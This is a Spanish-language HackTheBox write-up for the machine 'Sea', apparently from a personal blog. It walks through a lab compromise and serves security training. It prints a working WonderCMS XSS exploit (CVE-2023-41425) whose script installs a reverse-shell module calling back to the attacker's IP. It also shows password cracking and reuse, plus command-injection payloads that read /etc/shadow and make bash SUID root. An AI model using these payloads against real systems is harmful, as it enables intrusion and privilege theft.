@@ -1,0 +1,438 @@
+---
+title: "Máquina Sea"
+description: "Resolución de la máquina Sea de HackTheBox"
+tags: ["CVE-2023–41425", "Command Injection"]
+categories: ["HackTheBox", "Easy", "Linux"]
+logo: "/assets/writeups/sea/logo.webp"
+---
+
+Un WonderCMS viejo vulnerable a un CVE nos permitirá acceder como `www-data` y a otro usuario. Finalmente escalaremos privilegios abusando de una web interna vulnerable a inyección de comandos.
+
+## Reconocimiento
+
+La máquina tiene dos puertos abiertos:
+
+```bash
+# Nmap 7.95 scan initiated Sat Aug 10 15:01:20 2024 as: nmap -sS -Pn -n -p- --open -oN ports --min-rate 300 -vvv 10.129.4.78
+Nmap scan report for 10.129.4.78
+Host is up, received user-set (0.26s latency).
+Scanned at 2024-08-10 15:01:20 -04 for 194s
+Not shown: 58048 closed tcp ports (reset), 7485 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Sat Aug 10 15:04:34 2024 -- 1 IP address (1 host up) scanned in 194.31 seconds
+```
+
+El puerto 80 nos envía a `sea.htb`, por lo que lo agregaremos a nuestro archivos de hosts:
+
+```bash
+10.10.11.28 sea.htb
+```
+{: file="/etc/hosts" }
+
+Esta web no se ve muy interesante
+
+![Web](/assets/writeups/sea/1.png)
+
+Pero en la parte de `how-to-participate` nos da la opción de inscribirnos en una carrera de bicicletas enviando nuestros datos de participante:
+
+![Participate](/assets/writeups/sea/2.png)
+
+Tal vez un buen phishing sirva acá.
+
+## Intrusión
+
+### www-data - sea
+
+Si miramos el código HTML del frontend, notaremos cosas que parecen por defecto de un CMS
+
+```html
+... [snip]
+ <meta name="description" content="A page description is also good for search engines.">
+ <meta name="keywords" content="Enter, keywords, for, this page">
+... [snip]
+```
+{: file="index.html"}
+
+Buscando en internet, encontramos esto:
+
+![WonderCMS](/assets/writeups/sea/3.png)
+
+Suponiendo que este es el CMS utilizado por la página encontraremos vulnerabilidades e incluso un [PoC](https://gist.github.com/prodigiousMind/fc69a79629c4ba9ee88a7ad526043413), este CVE-2023-41425 nos indica que hay un XSS en la parte de login del CMS, y en una imagen podemos ver como funciona precisamente.
+
+Tomando el script de Python y ejecutándolo, nos generará un script de JavaScript (válgame la redundancia) que se usará en un servidor http, y al mismo tiempo nos dará un payload XSS para enviárselo a un administrador:
+
+```bash
+❯ python exploit.py http://sea.htb/loginURL 10.10.14.78 443
+[+] xss.js is created
+[+] execute the below command in another terminal
+
+----------------------------
+nc -lvp 443
+----------------------------
+
+send the below link to admin:
+
+----------------------------
+http://sea.htb/index.php?page=loginURL?"></form><script+src="http://10.10.14.78:8000/xss.js"></script><form+action="
+----------------------------
+
+
+starting HTTP server to allow the access to xss.js
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+```
+
+```js
+var url = "http://sea.htb/loginURL";
+if (url.endsWith("/")) {
+ url = url.slice(0, -1);
+}
+var urlWithoutLog = url.split("/").slice(0, -1).join("/");
+var urlWithoutLogBase = new URL(urlWithoutLog).pathname; 
+var token = document.querySelectorAll('[name="token"]')[0].value;
+var urlRev = urlWithoutLogBase+"/?installModule=https://github.com/prodigiousMind/revshell/archive/refs/heads/main.zip&directoryName=violet&type=themes&token=" + token;
+var xhr3 = new XMLHttpRequest();
+xhr3.withCredentials = true;
+xhr3.open("GET", urlRev);
+xhr3.send();
+xhr3.onload = function() {
+ if (xhr3.status == 200) {
+   var xhr4 = new XMLHttpRequest();
+   xhr4.withCredentials = true;
+   xhr4.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php");
+   xhr4.send();
+   xhr4.onload = function() {
+     if (xhr4.status == 200) {
+       var ip = "10.10.14.78";
+       var port = "443";
+       var xhr5 = new XMLHttpRequest();
+       xhr5.withCredentials = true;
+       xhr5.open("GET", urlWithoutLogBase+"/themes/revshell-main/rev.php?lhost=" + ip + "&lport=" + port);
+       xhr5.send();
+       
+     }
+   };
+ }
+};
+```
+{: file="xss.js" }
+
+Si lees el código del script, notarás que hay una línea que apunta a un archivo hospedado en GitHub, pero como las máquinas de HackTheBox no tienen acceso a internet tendremos que descargarnos ese archivo y cambiar el enlace a nuestro servidor (`http://<ip>:<port>/main.zip`), además de que tendremos que arreglar otras cosas como asignarle a la variable `urlWithoutLogBase` el mismo valor de `urlLogBase`, ya que de lo contrario, no funcionará.
+
+Ahora, si colocamos el enlace que nos ha generado, dentro del campo de `Website` en `contact.php` que vimos antes suponiendo que alguien le va a dar click, eventualmente veremos esto en el servidor http
+
+```bash
+10.10.11.28 - - [21/Dec/2024 10:04:42] "GET /xss.js HTTP/1.1" 200 -
+10.10.11.28 - - [21/Dec/2024 10:04:52] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [21/Dec/2024 10:04:53] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [21/Dec/2024 10:04:53] "GET /main.zip HTTP/1.1" 200 -
+10.10.11.28 - - [21/Dec/2024 10:04:53] "GET /main.zip HTTP/1.1" 200 -
+```
+
+y luego, en otra ventana con un netcat en escucha por el puerto que le especificamos al script del exploit:
+
+```bash
+❯ nc -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.28 60582
+Linux sea 5.4.0-190-generic #210-Ubuntu SMP Fri Jul 5 17:03:38 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 14:04:54 up  1:15,  0 users,  load average: 1.24, 1.60, 1.83
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
+
+Vamos a mejorar esta shell:
+
+```bash
+$ script /dev/null -c bash # Inicia un nuevo proceso
+Script started, file is /dev/null
+www-data@sea:/$ ^Z # CTRL + Z
+[1]  + 11082 suspended  nc -lvnp 443
+
+❯ stty raw -echo; fg # Pasar controles de la terminal al proceso
+[1]  + 11082 continued  nc -lvnp 443
+                                    reset xterm # Reiniciar terminal
+www-data@sea:/$ export TERM=xterm-256color # Establecer tipo de terminal
+www-data@sea:/$ stty rows 34 columns 149 # Establecer filas y columnas
+www-data@sea:/$ source /etc/skel/.bashrc # ¡Colores!
+```
+
+### amay - sea
+
+En los archivos del WonderCMS, podemos encontrar un hash bcrypt en el `database.js`:
+
+```bash
+www-data@sea:/var/www/sea/data$ cat database.js
+{
+    "config": {
+        "siteTitle": "Sea",
+        "theme": "bike",
+        "defaultPage": "home",
+        "login": "loginURL",
+        "forceLogout": false,
+        "forceHttps": false,
+        "saveChangesPopup": false,
+        "password": "$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ\/D.GuE4jRIikYiWrD3TM\/PjDnXm4q",
+        "lastLogins": {
+            "2024\/12\/21 14:04:42": "127.0.0.1",
+            "2024\/12\/21 13:55:11": "127.0.0.1",
+            "2024\/12\/21 13:52:10": "127.0.0.1",
+            "2024\/12\/21 13:49:10": "127.0.0.1",
+            "2024\/12\/21 13:46:34": "10.10.14.78"
+        },
+... [snip]
+```
+
+Este hash es crackeable
+
+```bash
+$2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM/PjDnXm4q:mychemicalromance
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2y$10$iOrk210RQSAzNCx6Vyq2X.aJ/D.GuE4jRIikYiWrD3TM...DnXm4q
+Time.Started.....: Sat Dec 21 10:15:07 2024 (1 min, 0 secs)
+Time.Estimated...: Sat Dec 21 10:16:07 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       51 H/s (9.55ms) @ Accel:4 Loops:32 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 3072/14344384 (0.02%)
+Rejected.........: 0/3072 (0.00%)
+Restore.Point....: 3056/14344384 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:992-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: 753159 -> dangerous
+Hardware.Mon.#1..: Temp: 70c Util: 91%
+
+Started: Sat Dec 21 10:14:19 2024
+Stopped: Sat Dec 21 10:16:08 2024
+```
+
+y dicha contraseña es reutilizada por la usuaria `amay`
+
+```bash
+www-data@sea:/var/www/sea$ su amay
+Password: 
+amay@sea:/var/www/sea$
+```
+
+En su directorio personal está la primera flag.
+
+```bash
+amay@sea:/var/www/sea$ cd ~
+amay@sea:~$ ls -la
+total 36
+drwxr-xr-x 5 amay amay 4096 Dec 21 04:05 .
+drwxr-xr-x 4 root root 4096 Jul 30 12:58 ..
+lrwxrwxrwx 1 root root    9 Aug  1 12:12 .bash_history -> /dev/null
+-rw-r--r-- 1 amay amay  220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 amay amay 3771 Feb 25  2020 .bashrc
+drwx------ 2 amay amay 4096 Aug  1 12:22 .cache
+drwx------ 3 amay amay 4096 Dec 21 04:05 .gnupg
+-rw-r--r-- 1 amay amay  807 Feb 25  2020 .profile
+drwx------ 2 amay amay 4096 Dec 21 06:57 .ssh
+-rw-r----- 1 root amay   33 Dec 21 03:26 user.txt
+amay@sea:~$ cat user.txt
+de90f82b68d3f359ef3037bcf5******
+```
+
+## Escalada de privilegios
+
+Hay un puerto interno que por afuera no veiamos; es el http-alt u `8080`:
+
+```bash
+amay@sea:~$ ss -ltu
+Netid         State          Recv-Q         Send-Q                 Local Address:Port                      Peer Address:Port         Process         
+udp           UNCONN         0              0                      127.0.0.53%lo:domain                         0.0.0.0:*                            
+udp           UNCONN         0              0                            0.0.0.0:bootpc                         0.0.0.0:*                            
+tcp           LISTEN         0              511                          0.0.0.0:http                           0.0.0.0:*                            
+tcp           LISTEN         0              4096                       127.0.0.1:http-alt                       0.0.0.0:*                            
+tcp           LISTEN         0              10                         127.0.0.1:59093                          0.0.0.0:*                            
+tcp           LISTEN         0              4096                   127.0.0.53%lo:domain                         0.0.0.0:*                            
+tcp           LISTEN         0              128                          0.0.0.0:ssh                            0.0.0.0:*                            
+tcp           LISTEN         0              128                             [::]:ssh                               [::]:*                            
+```
+
+Si le hacemos un curl, veremos que dice lo siguiente:
+
+```bash
+amay@sea:~$ curl -v http://127.0.0.1:8080/
+*   Trying 127.0.0.1:8080...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+> GET / HTTP/1.1
+> Host: 127.0.0.1:8080
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+* HTTP 1.0, assume close after body
+< HTTP/1.0 401 Unauthorized
+< Host: 127.0.0.1:8080
+< Date: Sat, 21 Dec 2024 14:18:59 GMT
+< Connection: close
+< X-Powered-By: PHP/7.4.3-4ubuntu2.23
+< WWW-Authenticate: Basic realm="Restricted Area"
+< Content-type: text/html; charset=UTF-8
+< 
+* Closing connection 0
+Unauthorized access
+```
+
+Nos pide credenciales, pero ya que curl tiene parámetros para establecer credenciales podemos intentar ponerle la que ya conocemos, y en efecto se reutiliza acá también:
+
+```bash
+amay@sea:~$ curl --basic -u 'amay:mychemicalromance' -v http://127.0.0.1:8080
+*   Trying 127.0.0.1:8080...
+* TCP_NODELAY set
+* Connected to 127.0.0.1 (127.0.0.1) port 8080 (#0)
+* Server auth using Basic with user 'amay'
+> GET / HTTP/1.1
+> Host: 127.0.0.1:8080
+> Authorization: Basic YW1heTpteWNoZW1pY2Fscm9tYW5jZQ==
+> User-Agent: curl/7.68.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Host: 127.0.0.1:8080
+< Date: Sat, 21 Dec 2024 14:21:11 GMT
+< Connection: close
+< X-Powered-By: PHP/7.4.3-4ubuntu2.23
+< Content-type: text/html; charset=UTF-8
+< 
+... [snip]
+```
+
+Leyendo el HTML, podremos ver que se trata de un monitor del sistema desarrollado por la misma amay al parecer. Si continuamos leyendo veremos que hay un formulario con un parámetro `log_file` con dos opciones, pero esas dos opciones son solamente las que nos dice la web (jiji).
+
+Si le intentamos enviar otro archivo, ahora nos dirá que no hay contenido malicioso en este:
+
+```bash
+amay@sea:~$ curl --basic -u 'amay:mychemicalromance' -d "log_file=/etc/passwd&analyze_log" http://127.0.0.1:8080/
+... [snip]
+        <div class="status">
+            <h2>Analyze Log File</h2>
+            <form action="" method="post">
+                <select name="log_file">
+                    <option value="/var/log/apache2/access.log">access.log</option>
+                    <option value="/var/log/auth.log">auth.log</option>
+                </select>
+                <button type="submit" name="analyze_log" class="button">Analyze</button>
+            </form>
+            <p>No suspicious traffic patterns detected in /root/root.txt.</p>        </div>
+
+    </div>
+</body>
+</html>
+```
+
+y si le intentamos colar algo para poder inyectar comandos, ahora nos dirá:
+
+```bash
+amay@sea:~$ curl --basic -u 'amay:mychemicalromance' -d "log_file=/etc/passwd|ps&analyze_log" http://127.0.0.1:8080/
+... [snip]
+<button type="submit" name="analyze_log" class="button">Analyze</button>
+            </form>
+                  1 ?        00:00:02 systemd
+    494 ?        00:00:09 systemd-journal
+    527 ?        00:00:00 systemd-udevd
+    803 ?        00:00:07 vmtoolsd
+    856 ?        00:00:00 systemd-logind
+<p class='error'>Suspicious traffic patterns detected in /etc/passwd|ps:</p><pre>    856 ?        00:00:00 systemd-logind</pre>        </div>
+... [snip]
+```
+
+Eso significa que podemos inyectar comandos... incluso al intentar agregarle una condicional OR (`||`), nos mostrará el contenido de todos los archivos que le metamos:
+
+```bash
+amay@sea:~$ curl --basic -u 'amay:mychemicalromance' -d "log_file=/etc/passwd||echo%20'1'&analyze_log" http://127.0.0.1:8080/
+</form>
+... [snip]
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+fwupd-refresh:x:111:116:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:113:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+amay:x:1000:1000:amay:/home/amay:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+geo:x:1001:1001::/home/geo:/bin/bash
+_laurel:x:997:997::/var/log/laurel:/bin/false
+<p class='error'>Suspicious traffic patterns detected in /etc/passwd||echo '1' >/tmp/asd:</p><pre>_laurel:x:997:997::/var/log/laurel:/bin/false</pre>        </div>
+... [snip]
+```
+
+Si intentamos leer archivos privilegiados como el `shadow`, el aplicativo nos lo retornará sin problemas, lo que es un claro indicio de que este proceso está siendo ejecutado por root. Aprovechandonos de la ejecución de comandos ahora simplemente haremos que la bash sea un binario SUID.
+
+```bash
+amay@sea:~$ curl --basic -u 'amay:mychemicalromance' -d "log_file=/etc/shadow|chmod%20u%2bs%20/bin/bash&analyze_log" http://127.0.0.1:8080/
+... [snip]
+amay@sea:~$ ls -la /bin/bash
+-rwsr-xr-x 1 root root 1183448 Apr 18  2022 /bin/bash
+```
+
+Con esto ya podremos tomar la última flag.
+
+```bash
+amay@sea:~$ bash -p
+bash-5.0# cd /root
+bash-5.0# ls -la
+total 44
+drwx------  7 root root 4096 Dec 21 03:26 .
+drwxr-xr-x 19 root root 4096 Feb 21  2024 ..
+lrwxrwxrwx  1 root root    9 Aug  1 12:12 .bash_history -> /dev/null
+-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
+drwx------  2 root root 4096 Aug 14 15:25 .cache
+drwxr-xr-x  2 root root 4096 Feb 25  2024 monitoring
+drwx------  3 root root 4096 Feb 21  2024 .pki
+-rw-r--r--  1 root root  161 Dec  5  2019 .profile
+-rw-r-----  1 root root   33 Dec 21 03:26 root.txt
+drwxr-xr-x  2 root root 4096 Aug  1 12:17 scripts
+drwx------  2 root root 4096 Feb 21  2024 .ssh
+-rw-------  1 root root  797 Aug  5 07:17 .viminfo
+bash-5.0# cat root.txt
+3549c1debd57b6d430c38f8e07******
+```
+
+## Extra
+
+Debido al vector de la escalada de privilegios, técnicamente puedes saltarte el comprometer a amay simplemente descubriendo el servidor web antes que lo demás.
+
+Sobre el foothold, no sé porqué razón el script no me funcionó con simplemente alterar la url desde la que se descargaba el tema del CMS. Cuando completé la máquina por primera vez me funcionó prácticamente sin tener que editarle la lógica.
